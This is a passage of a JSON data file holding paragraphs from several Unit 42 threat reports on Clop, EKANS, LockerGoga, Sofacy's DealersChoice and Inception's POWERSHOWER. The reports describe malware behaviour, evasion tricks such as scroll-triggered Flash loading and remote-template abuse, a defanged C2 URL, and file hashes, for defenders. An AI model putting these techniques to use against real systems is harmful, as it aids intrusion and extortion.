                "Additionally, there has been evidence of an affiliate using a webshell named DEWMODE that was being used to steal data from Accellion FTA devices.",
                "Not long after compromise, victims affected by DEWMODE began receiving emails from threat actors announcing the breach with an unique URL per victim to start negotiation efforts.",
                "If ignored, the threat actors would reach out again with an ultimatum of releasing the data to Cl0p^_-Leaks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clop didn't have a leak site when it was first sighted back in February 2019.",
                "It was in March 2020 when the threat actors decided to launch a leak site titled, Cl0p^_- Leaks (Figure 2).",
                "This website is a Tor-based blog site, where victims who dont pay the ransom or ignore threats have their confidential data publicly exposed.",
                "The threat actors behind Clop also leverage a variety of extortion techniques, such as targeting workstations of top executives, doxxing employees and advertising their breaches to reporters."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "More information on ransomware and victimology can be found in the 2021 Unit 42 Ransomware Threat Report."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This section documents relevant tactics, techniques and procedures (TTPs) used with Clop and maps them directly to Palo Alto Networks product(s) and service(s).",
                "It also further instructs customers on how to ensure their devices are configured correctly."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Courses of Action for Clop ransomware.",
                "These capabilities are part of the NGFW security subscriptions service.",
                "* These analytic detectors will trigger automatically for Cortex XDR Pro customers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clop ransomware is a high-profile ransomware family that has compromised industries globally.",
                "Organizations should be aware of SDBot, used by TA505, and how it can lead to the deployment of Clop ransomware.",
                "Like many other current ransomware families, Clop hosts a leak site to create additional pressure and shame victims into paying the ransom."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators associated with this Threat Assessment are available on GitHub, have been published to the Unit 42 TAXII feed and are viewable via the ATOM Viewer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In addition to the above courses of action, AutoFocus customers can review additional activity by using the tag Clop."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.",
                "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
                "For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org."
            ]
        }
    ],
    "d4e81c405340c426fbd0053d46a0ffc02cb2fff6": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42 researchers have observed recent EKANS (Snake backward) ransomware activity affecting multiple industries in the U.S and Europe.",
                "As a result, weve created this threat assessment report for the activities of this ransomware.",
                "Identified techniques and campaigns can be visualized using the Unit 42 Playbook Viewer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EKANS, which was first observed in January 2020, has relatively basic ransomware behavior, as it primarily seeks to encrypt your files and display a ransom note when finished.",
                "Although EKANS is basic in terms of file encryption, it's worth mentioning that it does have some interesting functionalities that make it distinct from other ransomware strains.",
                "EKANS ransomware is written in Golang and includes a static kill list that will stop numerous antivirus and Industrial Control Systems (ICS) processes and services.",
                "After killing the processes, it then proceeds to delete shadow copies to disable any restoration capabilities.",
                "Like many ransomware malware families, EKANS attempts to also encrypt resources connected to the victims machine via the network."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After encrypting files, EKANS doesnt follow a uniform extension change like other active ransomware.",
                "Instead, EKANS modifies the extension with five random characters.",
                "This may be an attempt by the creators of the ransomware to evade instant detection by just looking at the file extensions.",
                "One way to identify an EKANS infection is by looking for the hexadecimal string of EKANS at the end of the file, which is added by the ransomware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EKANS intrusion vector at the moment seems to be spearphishing, to compromise credentials.",
                "Having file-blocking policies in place, and securing any open Remote Desktop Protocol (RDP) ports will help prevent the malware from entering the network.",
                "We encourage ICS asset owners to review their security posture against malware, such as EKANS, that aims to disrupt ICS operations.",
                "The EKANS operators have affected different industries including energy, architecture firms, healthcare, transportation, and manufacturing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks Threat Prevention platform with WildFire, and Cortex XDR detects activity associated with this ransomware.",
                "Customers can also review activity associated with this Threat Assessment using AutoFocus with the following tag: EKANS."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Several adversarial techniques were observed in this activity and the following measures are suggested within Palo Alto Networks products and services to ensure mitigation of threats related with the EKANS ransomware, as well as other malware using the similar techniques:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Courses of Action for EKANS ransomware\nThese capabilities are part of the NGFW security subscriptions service"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "EKANS is a relatively new ransomware, and we still continue to investigate the threat, thats active targeting vulnerable enterprises for financial gain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although we havent seen EKANS leveraging compromised RDP, one of ransomware's top intrusion vectors are unsecured RDP ports.",
                "Its always good practice to close those ports if they are not needed, or secure them.",
                "We encourage having the proper protections and best practices in place to prevent EKANS into getting into, or executing within, your network."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ICS asset owners should particularly be aware of this ransomware as it tries to kill ICS-related processes, so reviewing their security posture against this threat is recommended."
            ]
        },
        {
            "type": "caption",
            "content": [
                "The suggested courses of action in this report are based on the information currently available to Palo Alto Networks and the capabilities within Palo Alto Networks\u2019 products and services."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additional Resources"
            ]
        }
    ],
    "5073c124937f47cda5dfe1829998b2fa20b61f73": [
        {
            "type": "paragraph",
            "content": [
                "This Unit 42 blog provides insights into the ransomware attacks referred to as LockerGoga."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The LockerGoga ransomware was first publicly reported in January by Bleeping Computer, which tied the malware to an attack against French engineering company Altran Technologies.",
                "Several variants have since been found in the wild, where they were used in attacks against Norwegian aluminum manufacturer Norsk Hydro and two chemical companies: Hexion and Momentive.",
                "Unit 42 reviewed malware samples from these attacks and found evidence that caused us to question the origin of the threat name.",
                "LockerGoga was taken from a string that did not exist anywhere in the code used in the original attack on Altran.",
                "Bleeping Computer reported that the name came from this source code path discovered by MalwareHunterTeam:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "X:\\work\\Projects\\LockerGoga\\cl-src-last\\cryptopp\\src\\rijndael_simd.cpp for SHA256 bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were able to find this string referenced in earlier ransomware variants identified as Ransom.GoGalocker by Symantec, but not in the sample identified in Bleeping Computers report.",
                "To avoid confusion, we will continue to use the LockerGoga name to refence the initial variant and its predecessors.",
                "Palo Alto Networks has identified 31 ransomware samples that are similar in behavior and code to the initial variant.",
                "In this report we will attempt to trace back to the origin of these samples, discuss their evolution, then expose some of their inner working capabilities and even faults."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The earliest known sample of LockerGoga (SHA256: bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f) we found was submitted to VirusTotal on January 24.",
                "We believe this sample was used in the attack on Altran.",
                "We do not know how the ransomware infected Altrans networks or propagated once there."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Currently LockerGoga does not support any worm-like capabilities that would allow it to self-propagate by infecting additional hosts on a target network.",
                "We have observed LockerGoga moving around a network via the server message block (SMB) protocol, which indicates the actors simply manually copy files from computer to computer."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This sample requires administrative privileges in order to successfully execute, though the specific mechanism for initial code execution is unknown.",
                "Once it executes it seeks toencrypt files on the infected computer and any attached hard drives.",
                "Once its fully executed, it leaves a ransom note on the users desktop containing an email address to contact presumably for decryption and payment options."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial sample was written in the C++ programming language and employs publicly available libraries such as Boost, Cryptopp and regex.",
                "This sample includes a denylist that excludes the following files and directories from encryption:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware does not support any self-propagating code to infect other hosts on the network and is signed by a certificate issued in the name MIKL LIMITED, which has been revoked.",
                "The following command line arguments are also supported:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Supported command line arguments"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "LockerGoga uses the Cryptopp library to implement RSA, as implementing RSA from scratch would be very time consuming and error prone.",
                "To encrypt files, (Strong RSA) RSA-OAEP MGF1(SHA-1) is used.",
                "The RSA public key found in this sample is:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. RSA Public key found in initial LockerGoga sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although RSA-OAEP MGF1 has features that make it more secure, the added computational overhead causes encryption to take longer and has difficulty handling large files.",
                "To mitigate this, the developers launch multiple child processes that work in parallel to maximize encryption speed.",
                "To overcome large files, the developers decided to encrypt chunks of a file every 80,000 bytes and skip the next 80,000 bytes of a file.",
                "Example:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Data encrypted in 80,000 byte chunks"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Because of this, partial recovery of large files might be possible even without the decryption key."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although the developers attempt to use a denylist of files and directories to skip, it was observed encrypting core Windows operating system files, which caused the operating system to become unstable and crash.",
                "This was observed when running the ransomware on a Windows 2012 machine."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on our analysis, we believe this variant is an early release of LockerGoga ransomware.",
                "The developers left behind command line parameters such as -r which allows the malware to run without encrypting anything.",
                "This can be used in conjunction with -l (log) to test how the ransomware behaves.",
                "Both of these parameters are suggestive of an initial, or test, build.",
                "The -r specifically was not observed in later variants."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "According to the Bleeping Computer report, the ransomware appeared to encrypt only the following specific file extensions: doc|dot|wbk|docx|dotx|docb|xlm|xlsx|xltx|xlsb|xlw|ppt|pot|pps|pptx|potx|ppsx|sldx|pdf."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our analysis found that the malware does not use the code block that checks for specific file extensions.",
                "Instead, we observed that the malware encrypts all files except those in the denylist.",
                "It also has issues with large files, which is addressed in later variants."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like other active software projects, the LockerGoga ransomware is under constant development with new variants being developed and used to attack victims.",
                "All these variants share similar characteristics and just like other professional development, each release contains improvements or new capabilities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To counter this ongoing development cycle, security researchers have to focus on identifying new variants."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To that end, we highlight some of the evolutionary changes we have observed since the malware surfaced in January:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "LockerGogas",
                "developers continue to add capabilities and launch new attacks.",
                "The addition of WS2_32.dll and use of undocumented Windows API calls indicates a level of sophistication beyond typical ransomware authors.",
                "The former could lead to the eventual inclusion of C2 communication or automated propagation, and the latter requires some working knowledge of Windows internals."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These features raise more questions about the actors intent as ransomware is typically one of the least advanced forms of malware: Are they motivated by profits or something else?",
                "Has the motive change over time?",
                "Why would developers put such effort into their work only to partially encrypt files.",
                "Why do they include an email address and not seek payment through more frequently used cryptocurrencies?"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We do not know if any of the victims have paid the ransom and were able to successfully retrieve their data.",
                "We do know that this ransomware has caused significant harm.",
                "The damage could increase significantly if the attackers continue to refine this ransomware.",
                "Unit 42 will continue to monitor LockerGoga and report on new activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "WildFire properly identifies all of the malware samples listed in this report as malicious.",
                "Traps prevents execution of LockerGoga samples and AutoFocus customers can view LockerGoga samples using the LockerGoga tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.",
                "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
                "For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ae7e9839b7fb750128147a9227d3733dde2faacd13c478e8f4d8d6c6c2fc1a55"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f474a8c0f66dee3d504fff1e49342ee70dd6f402c3fa0687b15ea9d0dd15613a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ffab69deafa647e2b54d8daf8c740b559a7982c3c7c1506ac6efc8de30c37fd5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c1670e190409619b5a541706976e5a649bef75c75b4b82caf00e9d85afc91881"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "65d5dd067e5550867b532f4e52af47b320bd31bc906d7bf5db889d0ff3f73041"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "31fdce53ee34dbc8e7a9f57b30a0fbb416ab1b3e0c145edd28b65bd6794047c1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "32d959169ab8ad7e9d4bd046cdb585036c71380d9c45e7bb9513935cd1e225b5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e00a36f4295bb3ba17d36d75ee27f7d2c20646b6e0352e6d765b7ac738ebe5ee"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6d8f1a20dc0b67eb1c3393c6c7fc859f99a12abbca9c45dcbc0efd4dc712fb7c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "79c11575f0495a3daaf93392bc8134c652360c5561e6f32d002209bc41471a07"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "050b4028b76cd907aabce3d07ebd9f38e56c48c991378d1c65442f9f5628aa9e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1f9b5fa30fd8835815270f7951f624698529332931725c1e17c41fd3dd040afe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "276104ba67006897630a7bdaa22343944983d9397a538504935f2ec7ac10b534"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "88d149f3e47dc337695d76da52b25660e3a454768af0d7e59c913995af496a0f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c97d9bbc80b573bdeeda3812f4d00e5183493dd0d5805e2508728f65977dda15"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "06e3924a863f12f57e903ae565052271740c4096bd4b47c38a9604951383bcd1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a845c34b0f675827444d6c502c0c461ed4445a00d83b31d5769646b88d7bbedf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7bcd69b3085126f7e97406889f78ab74e87230c11812b79406d723a80c08dd26"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ba15c27f26265f4b063b65654e9d7c248d0d651919fafb68cb4765d1e057f93f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eda26a1cd80aac1c42cdbba9af813d9c4bc81f6052080bc33435d1e076e75aa0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7852b47e7a9e3f792755395584c64dd81b68ab3cbcdf82f60e50dc5fa7385125"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "14e8a8095426245633cd6c3440afc5b29d0c8cd4acefd10e16f82eb3295077ca"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "47f5a231f7cd0e36508ca6ff8c21c08a7248f0f2bd79c1e772b73443597b09b4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f3c58f6de17d2ef3e894c09bc68c0afcce23254916c182e44056db3cad710192"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9128e1c56463b3ce7d4578ef14ccdfdba15ccc2d73545cb541ea3e80344b173c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c3d334cb7f6007c9ebee1a68c4f3f72eac9b3c102461d39f2a0a4b32a053843a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6e69548b1ae61d951452b65db15716a5ee2f9373be05011e897c61118c239a77"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8cfbd38855d2d6033847142fdfa74710b796daf465ab94216fbbbe85971aee29"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5b0b972713cd8611b04e4673676cdff70345ac7301b2c23173cdfeaff564225c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c7a69dcfb6a3fe433a52a71d85a7e90df25b1db1bc843a541eb08ea2fd1052a4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The latest variant of LockerGoga uses memory mapped files to communicate between processes.",
                "To illustrate this, we captured the memory of a section created by a child process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. Child process mapped file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 1st byte (02) instructs the master process to process the data below.",
                "The data is base64 encoded in three parts and decodes to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Part 1:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unknown value"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Part 2:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tpcps.dllresx.dll.mui4__8wekyb3d8bbwe8ad1a740-4a7f-4a1a-9911-421d422834ed\\Assets\\Resources\\RequiredPrintCapabilities.xmlze-48_altform-unplated.png"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Part 3:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "m-unplated.png"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Example of initial variant of LockerGoga running on a host:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2.",
                "Initial LockerGoga running"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Initial LockerGoga Ransom Note:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3.",
                "Initial LockerGoga ransom note"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Latest LockerGoga Ransom Note:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4. Latest LockerGoga ransom note"
            ]
        }
    ],
    "707a9fce5faea74181e1b112edb664ee97218aa7": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nBack in October 2016, Unit 42 published an initial analysis on a Flash exploitation framework used by the Sofacy threat group called DealersChoice.",
                "The attack consisted of Microsoft Word delivery documents that contained Adobe Flash objects capable of loading additional malicious Flash objects embedded in the file or directly provided by a command and control server.",
                "Sofacy continued to use DealersChoice throughout the fall of 2016, which we also documented in our December 2016 publication discussing Sofacys larger campaign.",
                "On March 12and March 14, we observed the Sofacy group carrying out an attack on a European government agency involving an updated variant of DealersChoice.",
                "The updated DealersChoice documents used a similar process to obtain a malicious Flash object from a C2 server, but the inner mechanics of the Flash object contained significant differences in comparison to the original samples we analyzed.",
                "One of the differences was a particularly clever evasion technique: to our knowledge this has never been observed in use.",
                "With the previous iterations of DealersChoice samples, the Flash object would immediately load and begin malicious tasks.",
                "In the March attacks, the Flash object is only loaded if the user scrolls through the entire content of the delivery document and views the specific page the Flash object is embedded on.",
                "Also, DealersChoice requires multiple interactions with an active C2 server to successfully exploit an end system.",
                "The overall process to result in a successful exploitation is:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Attack\nThe attack involving this updated variant of DealersChoice was targeting a European government organization.",
                "The attack relied on a spear-phishing email with a subject of \"Defence & Security 2018 Conference Agenda\" that had an attachment with a filename of \"Defence & Security 2018 Conference Agenda.docx\".",
                "The attached document contains a conference agenda that the Sofacy group appears to have copied directly from the website for the \"Underwater Defence & Security 2018 Conference\" here.",
                "Opening the attached \"Defence & Security 2018 Conference Agenda.docx\" file does not immediately run malicious code to exploit the system.",
                "Instead, the user must scroll to the third page of the document, which will load a Flash object that contains ActionScript that will attempt to exploit the users system to install a malicious payload.",
                "The Flash object embedded within this delivery document is a variant of an exploit tool that we call DealersChoice.",
                "This suggests that the Sofacy group is confident that the targeted individuals would be interested enough in the content to peruse through it.",
                "We analyzed the document to determine the reason that the malicious Flash object only ran when the user scrolled to the third page.",
                "According to the document.xml file, the DealersChoice loader SWF exists after the \"covert-shores-small.png\" image file within the delivery document.",
                "This image file exists on the third page of the document, so the user would have to scroll down in the document to this third page to get the SWF file to run.",
                "The user may not notice the Flash object on the page, as Word displays it as a tiny black box in the document, as seen in Figure 1.",
                "This is an interesting anti-sandbox technique, as it requires human interaction prior to the document exhibiting any malicious activity."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Flash object appearing as a small black box in delivery document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Updated DealersChoice\nThis DealersChoice Flash object shares a similar process to previous variants; however, it appears that the Sofacy actors have made slight changes to its internal code.",
                "Also, it appears that the actors used ActionScript from an open source video player called f4player, which is freely available on GitHub with the following description:\nf4Player is an open source flash (AS3) video player and library project.",
                "It is so small that it is only 10kb (with skin file) and totally free under GPL license.",
                "The Sofacy developer modified the f4players ActionScript to include additional code to load an embedded Flash object.",
                "The additions include code to decrypt an embedded Flash object and an event handler that calls a newly added function (skinEvent2) that plays the decrypted object, as seen in the code snippet below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The above code allows DealersChoice to load a second SWF object, specifically loading it with an argument that includes a C2 URL of hxxp://ndpmedia24[.]com/0pq6m4f.m3u8.",
                "The embedded SWF extracts the domain from the C2 URL passed to it and uses it to craft a URL to get the server's 'crossdomain.xml' file in order to obtain permissions to load additional Flash objects from the C2 domain.",
                "The ActionScript relies on event listeners to call specific functions when the event \"Event.COMPLETE\" is triggered after successful HTTP requests are issued to the C2 server.",
                "The event handlers call functions with the following names, which includes an incrementing number that represents the order in which the functions are called:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With these event handlers created, the ActionScript starts by gathering system data from the flash.system.Capabilities.serverString property (just like in the original DealersChoice.B samples) and issues an HTTP GET with the system data as a parameter to the C2 URL that was passed as an argument to the embedded SWF when it was initially loaded.",
                "When this HTTP request completes, the event listener will call the 'onload1' function.",
                "The 'onload1' function parses the response data from the request to the C2 URL using regular expressions.",
                "According to the following code snippet, it appears the regular expression is looking for a hexadecimal string after \"/\" and before \"/sec\", as well as any string between \"/hls/\" and \"/tracks\":"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The regular expressions suggest that the C2 server responds with content that is meant to resemble HTTP Live Steaming (HLS) traffic, which is a protocol that uses HTTP to deliver audio and video files for streaming.",
                "The use of HLS coincides with the use of ActionScript code from the f4player to make the traffic seem legitimate.",
                "The variables storing the results of the regular expression matches are used within the ActionScript for further interaction with the C2 server.",
                "The following is a list of these variables and their purpose:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 'onload1' function then sends an HTTP GET request to the C2 domain using the value stored in the 'r3' variable as a URL.",
                "When this HTTP request completes, the event listener will call the 'onload2' function.",
                "The 'onload2' function decrypts the response received from the HTTP request issued in 'onload1' function.",
                "It does so by calling a sub-function to decrypt the content, using the value stored in the 'r1' variable as a key.",
                "The sub-function to decrypt the content skips the first 4 bytes, suggesting that the first four bytes of the downloaded content is in cleartext (most likely the \"FWS\" or \"CWS\" header to look legitimate).",
                "After decrypting the content, the 'onload2' function will issue another HTTP GET request with the system data as a parameter, but this time to the C2 using a URL from the 'r4' variable.",
                "When this request completes, the event listener will call the 'onload3' function.",
                "The 'onload3' function will take the response to the HTTP request in 'onload2' and treat it as the payload.",
                "The ActionScript will read each byte of the C2 response and get the hexadecimal value of each byte and create a text array of 4-byte hexadecimal values with \"0x\" prepended and \",\" appended to each using the following code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This hexadecimal string will most likely be a string of shellcode that will contain and decrypt the ultimate portable executable (PE) payload.",
                "The string of comma separated hexadecimal values is passed as a parameter when loading the SWF file downloaded in 'onload2'.",
                "This function creates an event listener for when the SWF file is successfully loaded, which will call the 'onload5' function.",
                "The 'onload5' function is responsible for adding the newly loaded SWF object as a child object to the current running object using the following code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This loads the SWF file, effectively running the malicious code on the system.",
                "During our analysis, we were unable to coerce the C2 into providing a malicious SWF or payload.",
                "As mentioned in our previous blogs on DealersChoice, the payload of choice for previous variants was SofacyCarberp (Seduploader), but we have no evidence to suggest this tool was used in this attack.",
                "We are actively researching and will update this blog in the event we discover the malicious Flash object and payload delivered in this attack.\n\nLinkage to Prior Campaign\nThe delivery document used in this attack was last modified by a user named 'Nick Daemoji', which provides a linkage to previous Sofacy related delivery documents.",
                "The previous documents that used this user name were macro-laden delivery documents that installed SofacyCarberp/Seduploader payloads, as discussed in Talos' blog.",
                "This overlap also points to a similar social engineering theme between these two campaigns, as both used content from upcoming military and defense conferences as a lure.\n\nConclusion\nThe Sofacy threat group continues to use their DealersChoice framework to exploit Flash vulnerabilities in their attack campaigns.",
                "In the most recent variant, Sofacy modified the internals of the malicious scripts, but continues to follow the same process used by previous variants by obtaining a malicious Flash object and payload directly from the C2 server.",
                "Unlike previous samples, this DealersChoice used a DOCX delivery document that required the user to scroll through the document to trigger the malicious Flash object.",
                "The required user interaction turned out to be an interesting anti-sandbox technique that we had not seen this group perform in the past.\n\nIndicators of Compromise\nDealersChoice",
                "0cd9ac328d858d8d83c9eb73bfdc59a958873b3d71b24c888d7408d9512a41d7 (Defence & Security 2018 Conference Agenda.docx)\nndpmedia24[.]com\n\nMacro-ladened documents\ne5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179ae\nefb235776851502672dba5ef45d96cc65cb9ebba1b49949393a6a85b9c822f52\nc4be15f9ccfecf7a463f3b1d4a17e7b4f95de939e057662c3f97b52f7fa3c52f"
            ]
        }
    ],
    "2075ecaf6beda573727b558826dbef586368bcaa": [
        {
            "type": "paragraph",
            "content": [
                "The Inception attackers have been active since at least 2014 and have been documented previously by both Blue Coat and Symantec; historical attacks used custom malware for a variety of platforms, and targeting a range of industries, primarily in Russia, but also around the world.",
                "This blog describes attacks against European targets observed in October 2018, using CVE-2017-11882 and a new PowerShell backdoor were calling POWERSHOWER due to the attention to detail in terms of cleaning up after itself, along with the malware being written in PowerShell."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has previously observed attacks from the group in 2017 against government targets in Europe, Russia, and Central Asia and expects these to remain the primary regions this threat is seen."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the last writeup by Symantec they describe a two-stage spear phishing process used by the Inception attackers, whereby the attackers first send a reconnaissance spear phish, and follow this up with a second spear phish containing a remote template, which if loaded delivers a first stage payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In their most recent attacks it appears that only one document is used, but in a way that allows them to not reveal their final payload immediately; however, the use of templates remains the same."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote Templates are Great"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Remote templates are a feature of Microsoft Word which allow a document to load a template to be used in a document  this template can be externally hosted, either on a file share, or on the internet.",
                "The template is then loaded when the document is opened.",
                "The Inception attackers use this feature in a malicious context as shown in Figure 1 below:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Overview of how the attack takes place."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using a remote template in this way has been a consistent feature of the Inception attackers attacks for the past 4 years and has three main benefits to the attacker:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2. Example of how remote templates are referenced in Inception documents."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When opened, the documents display decoy content and attempts to fetch a malicious remote payload via HTTP.",
                "The decoy content is usually copied from media reports, often with political themes in the target regions, some examples of decoys observed are shown in Figure 3, including invites to international conferences and news articles on the current situation in Crimea."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Examples of decoys shown in Inception attacks in 2018.",
                "The first is taken from a VGOPAD invitation sent on Facebook in 2017, the second is from a European Policy center summary."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On most occasions the remote server did not return a malicious template, however we recently observed two cases where a malicious template containing two exploits was served.",
                "In both cases the template contained exploits for both CVE-2012-1856 and CVE-2017-11882, which target vulnerabilities in Word disclosed and patched in 2012 and 2017 respectively."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload for the exploits was VBScript in an OLE package object, which in turn decodes and executes POWERSHOWER, a simple PowerShell backdoor."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "POWERSHOWER  Malware that Cleans up After Itself"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Earlier, we mentioned that previous attacks were apparently delivered over two spear phishing emails, with the first only being used for reconnaissance.",
                "In the latest cases we only observed a single document being sent to the targets, with reconnaissance, exploitation, and payload delivery happening on the first attempt."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropped payload, POWERSHOWER, acts as an initial reconnaissance foothold and is almost certainly used to download and execute a secondary payload with a more complete set of features.",
                "By only using this simple backdoor to establish a foothold, the attacker can hold back their most sophisticated and complex malware for later stages, making them less likely to be detected."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In a nutshell, POWERSHOWER allows the attacker to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "POWERSHOWER Analysis"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "POWERSHOWER first checks if Microsoft Word is currently running, if it is, then the malware assumes it is the first run through of the malware and performs the following operations:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If Microsoft Word is not running, the malware enters its main communications loop, performing the following actions in sequence, this loop should only be entered after a reboot of the machine:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The code behind the main C&C loop is shown in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4.",
                "The main C&C loop."
            ]
        },
        {
            "type": "paragraph",
            "content": [
